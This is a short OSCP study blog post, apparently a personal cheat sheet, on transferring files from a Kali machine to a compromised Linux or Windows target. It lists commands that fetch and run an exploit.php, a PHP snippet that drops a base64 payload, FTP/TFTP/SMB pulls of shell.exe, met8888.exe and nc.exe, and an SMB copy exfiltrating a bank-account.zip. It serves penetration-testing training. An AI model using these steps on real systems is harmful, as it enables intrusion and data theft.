---
title:  "Transfer files from Kali to the target machine"
date:   2018-03-26 03:22:33 +0800
categories: OSCP
classes:
  - landing
header:
  teaser: /assets/img/oscp-teaser.jpg
---

Tranfer files to the target machine is particularly useful when we have already had a reverse shell on Windows. Windows does not have convenient commands to download files such as wget in Linux.

## If PHP RFI is available
Use PHP base64_decode
```php
<?php
$file = '/tmp/findsock';
$fp = fopen($file, 'wb');
fwrite($fp, base64_decode($encoded));
fclose($fp);
system("chmod 0777 " . $file);
echo system("ls -la /tmp");
?>
```

## To Linux machine
Use wget
```
cd /tmp && wget -O exploit.php 10.11.0.105/exploit.php && php -f exploit.php
```

## To Windows machine
### HTTP Server
```
python -m SimpleHTTPServer 80
```
### FTP Server
To start Python FTP server:
```
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21 -w
```
To put/get files:
```
echo open 10.11.0.105>ftp.txt
echo anonymous>>ftp.txt
echo password>>ftp.txt
echo binary>>ftp.txt
echo get shell.exe>>ftp.txt 
echo bye>>ftp.txt
ftp -s:ftp.txt
```
### TFTP Server
To start Kali TFTP server:
```
service atftpd start
```
To get files (put does not work):
```
tftp -i 10.11.1.5 GET met8888.exe
tftp -i 10.11.0.105 PUT C:\bank-account.zip // Not working
```
If tftp is not available:
```
pkgmgr /iu:"TFTP"  
```
### SMB Server
To start SMB server:
```
python /opt/impacket/examples/smbserver.py ROPNOP /root/
```
To put/get files:
```
copy \\10.11.0.105\ROPNOP\nc.exe .
copy C:\bank-account.zip \\10.11.0.105\ROPNOP\
```
**References**
- [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
- [http://ostrokonskiy.tk/2017/01/23/windows-privilege-escalation/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
